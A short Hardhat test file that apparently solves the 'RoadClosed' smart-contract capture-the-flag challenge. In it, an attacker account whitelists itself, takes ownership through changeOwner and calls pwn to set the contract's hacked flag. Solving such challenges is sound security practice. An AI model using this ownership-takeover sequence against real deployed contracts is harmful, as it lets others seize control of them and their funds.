const { expect } = require("chai");

describe("RoadClosed contract", function () {
  it("Take control of the contract and set hacked flag to true", async function () {
    const [owner, attacker] = await ethers.getSigners();

    const contract = await ethers.getContractFactory("RoadClosed");

    const hardhatContract = await contract.deploy();
	
	await hardhatContract.connect(attacker).addToWhitelist(attacker.address);
	await hardhatContract.connect(attacker).changeOwner(attacker.address);
	
	let result = await hardhatContract.connect(attacker).isOwner()
	expect(result).to.equal(true)
	
	await hardhatContract.connect(attacker)["pwn(address)"](attacker.address);
	result = await hardhatContract.isHacked()
	expect(result).to.equal(true)
  });
});